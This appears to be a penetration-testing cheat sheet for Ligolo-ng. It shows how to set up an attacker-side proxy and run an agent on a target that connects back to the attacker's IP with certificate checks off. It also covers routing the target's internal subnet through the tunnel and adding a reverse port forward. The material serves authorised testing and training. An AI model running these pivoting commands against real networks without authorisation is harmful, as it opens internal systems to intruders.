# Ligolo-ng

> Tunneling tool that routes traffic through a **TUN interface** (VPN-like, no proxychains needed). The agent runs on the target **without admin**; the proxy (attacker side) needs rights to create a TUN interface.

## Tips

- [Docs](https://docs.ligolo.ng)
- [ligolo-ng (releases)](https://github.com/nicocha30/ligolo-ng/releases)

## Setup (attacker / proxy)

```bash
# Create and bring up the TUN interface (once)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start the proxy (listens for the agent)
./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT
```

## Agent (target)

::: code-group

```powershell [Windows]
.\agent.exe -connect $LIGOLO_IP:$LIGOLO_PORT -ignore-cert
```

```bash [Linux]
./agent -connect $LIGOLO_IP:$LIGOLO_PORT -ignore-cert
```

:::

## Start the tunnel (proxy session)

```bash
ligolo-ng » session   # select the connected agent
ligolo-ng » start     # start the tunnel
```

```bash
# On the attacker: route the target subnet through the TUN interface
sudo ip route add $SUBNET_TARGET/$NETMASK_TARGET dev ligolo
```

The target's internal subnet is now reachable directly.

## Reverse port forward (target -> attacker)

Expose a local attacker service to the target's network via the agent, from the proxy session:

```bash
ligolo-ng » listener_add --addr 0.0.0.0:$RPORT --to 127.0.0.1:$LPORT --tcp
```
